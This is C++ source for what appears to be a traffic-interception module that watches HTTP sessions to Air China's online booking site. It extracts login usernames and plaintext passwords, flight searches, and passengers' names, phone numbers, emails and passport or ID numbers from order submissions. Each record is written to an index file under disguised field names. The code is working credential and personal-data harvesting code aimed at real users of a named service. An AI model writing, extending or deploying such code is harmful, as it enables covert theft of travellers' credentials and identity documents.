
#include "StdAfx.h"
#include "PlaneAirChina.h"

plane::PlaneAirChina::PlaneAirChina(HttpSession *http_session, const string &pro_name) : Airplane(http_session,pro_name)
{
	
}

plane::PlaneAirChina::~PlaneAirChina()
{
	
}
		
// ID_CARD 身份证 2.DOC 护照，MI_CARD 军官证或其它证件
string plane::PlaneAirChina::GetIdType(string idType)
{
	string idTypeTrue;
	if (idType == "ID_CARD"){idTypeTrue = "身份证";}
	if (idType == "2.DOC"){idTypeTrue = "护照";}
	if (idType == "MI_CARD"){idTypeTrue = "军官证或其它证件";}
	return idTypeTrue;
}

int plane::PlaneAirChina::IsPlaneAirChina(HttpSession *http_session)
{
	//登录 非登录页面
	if((http_session->m_Requestline.m_Host.Find("et.airchina.com.cn")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/InternetBooking/ReservationLogin.do")!=-1)) 
	{										
		return kpclogin;
	}	
	//国内单程 往返 1 首页查询
	if((http_session->m_Requestline.m_Host.Find("et.airchina.com.cn")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/InternetBooking/AirLowFareSearchExt.do")!=-1)) 
	{										
		return kpcticket;
	}	
	//多段 1	首页查询
	if((http_session->m_Requestline.m_Host.Find("et.airchina.com.cn")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/InternetBooking/AirAvailabilitySearchExt.do")!=-1))
	{
		return kpcticket;
	}
	//国内单程 往返 跳转页查询
	if((http_session->m_Requestline.m_Host.Find("et.airchina.com.cn")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/InternetBooking/ValidateFormAction.do")!=-1)) 
	{										
		return kpcticketsecond;
	}	
	//提交订单
	if((http_session->m_Requestline.m_Host.Find("et.airchina.com.cn")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/InternetBooking/UpdateReservation.do")!=-1) )
	{
		return kpcorder;
	}
	return 0;
}

int plane::PlaneAirChina::Process(const char *packet,int action)
{
	//登录
	if (action == kpclogin)
	{
		return pclogin(packet);
	}
	//查询 首页
	if (action == kpcticket)
	{
		return pcticket(packet);
	}
	//查询 跳转页
	if(action == kpcticketsecond)
	{
		return pcticketsecond(packet);
	}
	//提交订单
	if (action == kpcorder)
	{
		return pcorder(packet);
	}
	return 1;
}

//登录
int plane::PlaneAirChina::pclogin(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');

	//登录类型
	string usernameType = ms_->GetValueFromMapByKey("usernameType",true);
	//账号
	string username = ms_->GetValueFromMapByKey("username",true);
	//密码
	string password = ms_->GetValueFromMapByKey("password",true);
	if (username.empty() && password.empty())
	{
		return 0;
	}
	output_text_ =
		"user=" + username + "\r\n" + //账号
		"pass=" + password + "\r\n" + //密码
		"state=登录\r\n";
	WriteIndexFile();
	return 1;
}
//国内 国际 单程 往返 首页
int plane::PlaneAirChina::pcticket(const char *packet)
{	
	//从uri
	string Referer = http_session_->m_Requestline.m_Referer.GetBuffer(0);
	//单程 往返 多段
	string tripTypeOw = "tripType=OW";
	string tripTypeRt = "tripType=RT";
	string tripTypeMc = "tripType=MC";
	if (Referer.find(tripTypeOw) != string::npos)
	{
		ms_->Replace(Referer, "?", "&");
		Referer = ms_->UTF8ToGBK(UrlDecode(Referer));
		ms_->SplitStringToMap(Referer,'&','=');
		//成年人数
		string adultCount = ms_->GetValueFromMapByKey("guestTypes[0].amount");
		//儿童人数
		string childCount = ms_->GetValueFromMapByKey("guestTypes[1].amount");
		//婴儿人数
		string infantCount = ms_->GetValueFromMapByKey("guestTypes[2].amount");  
		//出发地
		string originLocation = ms_->GetValueFromMapByKey("outboundOption.originLocationCode",true);
		//目的地
		string destinationLocation = ms_->GetValueFromMapByKey("outboundOption.destinationLocationCode",true);
		//出发日期
		string departureDate = ms_->GetValueFromMapByKey("outboundOption.departureYear",true) + "-" + 
							   ms_->GetValueFromMapByKey("outboundOption.departureMonth",true) + "-" +
							   ms_->GetValueFromMapByKey("outboundOption.departureDay",true);
		output_text_ =
			"netmark=" + adultCount + "\r\n" +			//成年人数
			"onick=" + 	childCount + "\r\n" +			//儿童人数
			"sex=" + 	infantCount + "\r\n" +			//婴儿人数
			"nick=" + 	originLocation + "\r\n" +		//出发地
			"msg=" + 	destinationLocation + "\r\n" +	//目的地 
			"servername=" + departureDate + "\r\n" +	//出发日期
			"state=查询\r\n";
		WriteIndexFile();
	}
	if (Referer.find(tripTypeRt) != string::npos)
	{
		ms_->Replace(Referer, "?", "&");
		Referer = ms_->UTF8ToGBK(UrlDecode(Referer));
		ms_->SplitStringToMap(Referer,'&','=');
		//成年人数
		string adultCount = ms_->GetValueFromMapByKey("guestTypes[0].amount");
		//儿童人数
		string childCount = ms_->GetValueFromMapByKey("guestTypes[1].amount");
		//婴儿人数
		string infantCount = ms_->GetValueFromMapByKey("guestTypes[2].amount");  
		//出发地
		string originLocation = ms_->GetValueFromMapByKey("outboundOption.originLocationCode",true);
		//目的地
		string destinationLocation = ms_->GetValueFromMapByKey("outboundOption.destinationLocationCode",true);
		//出发日期
		string departureDate = ms_->GetValueFromMapByKey("outboundOption.departureYear",true) + "-" + 
							   ms_->GetValueFromMapByKey("outboundOption.departureMonth",true) + "-" +
			                   ms_->GetValueFromMapByKey("outboundOption.departureDay",true);
		//返程日期
		string departureDateRt = ms_->GetValueFromMapByKey("inboundOption.departureYear",true) + "-" + 
							   ms_->GetValueFromMapByKey("inboundOption.departureMonth",true) + "-" +
							   ms_->GetValueFromMapByKey("inboundOption.departureDay",true);
		output_text_ =
			"netmark=" + adultCount + "\r\n" +			//成年人数
			"onick=" + 	childCount + "\r\n" +			//儿童人数
			"sex=" + 	infantCount + "\r\n" +			//婴儿人数
			"nick=" + 	originLocation + "\r\n" +		//出发地
			"msg=" + 	destinationLocation + "\r\n" +	//目的地 
			"servername=" + departureDate + "\r\n" +	//出发日期
			"appname=" + departureDateRt + "\r\n" +		//返程日期
			"state=查询\r\n";
		WriteIndexFile();
	}
	if (Referer.find(tripTypeMc) != string::npos)
	{
		//计算段数
		string tempCount = Referer.substr(Referer.rfind("multiCityOptions"),Referer.find("&guestTypes") - Referer.rfind("multiCityOptions"));
		tempCount = ms_->GetValueBetweenBeginEnd(tempCount,"[","]",true);
		int airCount = atoi(tempCount.c_str()); 

		ms_->Replace(Referer, "?", "&");
		Referer = ms_->UTF8ToGBK(UrlDecode(Referer));
		ms_->SplitStringToMap(Referer,'&','=');

		//成年人数
		string adultCount = ms_->GetValueFromMapByKey("guestTypes[0].amount");
		//儿童人数
		string childCount = ms_->GetValueFromMapByKey("guestTypes[1].amount");
		//婴儿人数
		string infantCount = ms_->GetValueFromMapByKey("guestTypes[2].amount");  
		for (int i=0 ;i<=airCount ;i++)
		{
			CString nCount;
			nCount.Format("%d",i);
			string mCount = nCount.GetBuffer(0);
			//出发地
			string originLocationTemp = "multiCityOptions[" + mCount + "].originLocationCode";
			string originLocation = ms_->GetValueFromMapByKey(originLocationTemp,true);
			//目的地
			string destinationLocationTemp = "multiCityOptions[" + mCount + "].destinationLocationCode";
			string destinationLocation = ms_->GetValueFromMapByKey(destinationLocationTemp,true);
			//出发日期  multiCityOptions[0].departureYear
			string tempYear = "multiCityOptions[" + mCount + "].departureYear";
			string tempMonth = "multiCityOptions[" + mCount + "].departureMonth";
			string tempDay = "multiCityOptions[" + mCount + "].departureDay";
			string departureDate = ms_->GetValueFromMapByKey(tempYear,true) + "-" + 
									ms_->GetValueFromMapByKey(tempMonth,true) + "-" +
									ms_->GetValueFromMapByKey(tempDay,true);
			output_text_ =
				"netmark=" + adultCount + "\r\n" +			//成年人数
				"onick=" + 	childCount + "\r\n" +			//儿童人数
				"sex=" + 	infantCount + "\r\n" +			//婴儿人数
				"nick=" + 	originLocation + "\r\n" +		//出发地
				"msg=" + 	destinationLocation + "\r\n" +	//目的地 
				"servername=" + departureDate + "\r\n" +	//出发日期
				"state=查询\r\n";
			WriteIndexFile();
		}
	}
	return 1;
}


//国内 国际 单程 往返 跳转页
int plane::PlaneAirChina::pcticketsecond(const char *packet)
{	
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	string tripType = ms_->GetValueFromMapByKey("tripType",true);
	//单程
	if (tripType == "OW")
	{
		//成年人数
		string adultCount = ms_->GetValueFromMapByKey("guestTypes[0].amount");
		//儿童人数
		string childCount = ms_->GetValueFromMapByKey("guestTypes[1].amount");
		//婴儿人数
		string infantCount = ms_->GetValueFromMapByKey("guestTypes[2].amount");  
		//出发地
		string originLocation = ms_->GetValueFromMapByKey("outboundOption.originLocationCode",true);
		//目的地
		string destinationLocation = ms_->GetValueFromMapByKey("outboundOption.destinationLocationCode",true);
		//出发日期
		string departureDate = ms_->GetValueFromMapByKey("outboundOption.departureYear",true) + "-" + 
							   ms_->GetValueFromMapByKey("outboundOption.departureMonth",true) + "-" +
							   ms_->GetValueFromMapByKey("outboundOption.departureDay",true);
		output_text_ =
			"netmark=" + adultCount + "\r\n" +			//成年人数
			"onick=" + 	childCount + "\r\n" +			//儿童人数
			"sex=" + 	infantCount + "\r\n" +			//婴儿人数
			"nick=" + 	originLocation + "\r\n" +		//出发地
			"msg=" + 	destinationLocation + "\r\n" +	//目的地 
			"servername=" + departureDate + "\r\n" +	//出发日期
			"state=查询\r\n";
		WriteIndexFile();
	}
	if (tripType == "RT")
	{
		//成年人数
		string adultCount = ms_->GetValueFromMapByKey("guestTypes[0].amount");
		//儿童人数
		string childCount = ms_->GetValueFromMapByKey("guestTypes[1].amount");
		//婴儿人数
		string infantCount = ms_->GetValueFromMapByKey("guestTypes[2].amount");  
		//出发地
		string originLocation = ms_->GetValueFromMapByKey("outboundOption.originLocationCode",true);
		//目的地
		string destinationLocation = ms_->GetValueFromMapByKey("outboundOption.destinationLocationCode",true);
		//出发日期
		string departureDate = ms_->GetValueFromMapByKey("outboundOption.departureYear",true) + "-" + 
							   ms_->GetValueFromMapByKey("outboundOption.departureMonth",true) + "-" +
			                   ms_->GetValueFromMapByKey("outboundOption.departureDay",true);
		//返程日期
		string departureDateRt = ms_->GetValueFromMapByKey("inboundOption.departureYear",true) + "-" + 
							   ms_->GetValueFromMapByKey("inboundOption.departureMonth",true) + "-" +
							   ms_->GetValueFromMapByKey("inboundOption.departureDay",true);
		output_text_ =
			"netmark=" + 	adultCount + "\r\n" +		//成年人数
			"onick=" + 	childCount + "\r\n" +			//儿童人数
			"sex=" + 	infantCount + "\r\n" +			//婴儿人数
			"nick=" + 	originLocation + "\r\n" +		//出发地
			"msg=" + 	destinationLocation + "\r\n" +	//目的地 
			"servername=" + departureDate + "\r\n" +	//出发日期
			"appname=" + 	departureDateRt + "\r\n" +	//返程日期
			"state=查询\r\n";
		WriteIndexFile();
	}
	return 1;
}

//提交订单
int plane::PlaneAirChina::pcorder(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	//联系人信息
	string contactName,contactMobile,contackEmail;
	contactName = ms_->GetValueFromMapByKey("travelArranger.lastName",true) + ms_->GetValueFromMapByKey("travelArranger.firstName",true);	
	contactMobile = ms_->GetValueFromMapByKey("travellersInfo[0].mobilePhone.phoneNumber",true);
	contackEmail = ms_->GetValueFromMapByKey("travellersInfo[0].emailAddress",true);
	//乘客信息 
	string passengerName,passengerIDtypeTemp,passengerIDtype,passengerIDcard,passengerTel;
	//乘客数量
	string travellersCount = ms_->GetValueFromMapByKey("travellersCount",true);
	int passengerCount = atoi(travellersCount.c_str());
	
	for(int i=0 ;i<passengerCount ;i++)
	{
		CString tempStr;
		tempStr.Format("%d",i);
		string tempStrCount = tempStr.GetBuffer(0);
		//乘客姓名
		string passengerNameTemp1 = "travellersInfo[" + tempStrCount + "].lastName";	
		string passengerNameTemp2 = "travellersInfo[" + tempStrCount + "].firstName";
		passengerName = ms_->GetValueFromMapByKey(passengerNameTemp1,true) + ms_->GetValueFromMapByKey(passengerNameTemp2,true);
		//乘客电话
		string passengerTelTemp = "travellersInfo[" + tempStrCount + "].personalPhone.phoneNumber";
		passengerTel = ms_->GetValueFromMapByKey(passengerTelTemp,true);
		//乘客证件类型
		string passengerIDtypeTemp = "travellersInfo[" + tempStrCount + "].advancedPassengerDetails(foid)";
		passengerIDtype = ms_->GetValueFromMapByKey(passengerIDtypeTemp,true);
		passengerIDtype = GetIdType(passengerIDtype);
		//乘客证件号
		string passengerIDcardTemp = "travellersInfo[" + tempStrCount + "].advancedPassengerDetails(foidNumber)";
		passengerIDcard = ms_->GetValueFromMapByKey(passengerIDcardTemp,true);

		output_text_ =
			"mid=" + 	contactName + "\r\n" +		//联系人姓名
			"oid=" + 	contactMobile + "\r\n" +	//联系人电话
			"imsi=" + 	contackEmail + "\r\n" +		//联系人邮箱
			"msgtype=" + passengerName + "\r\n" +	//乘客姓名
			"clientmsg=" + passengerTel + "\r\n" +	//乘客电话
			"webname=" + passengerIDtype + "\r\n" + //乘客证件类型
			"subject=" + passengerIDcard + "\r\n" + //乘客证件号
			"state=提交订单\r\n";
		WriteIndexFile();
	}
	return 1;
}
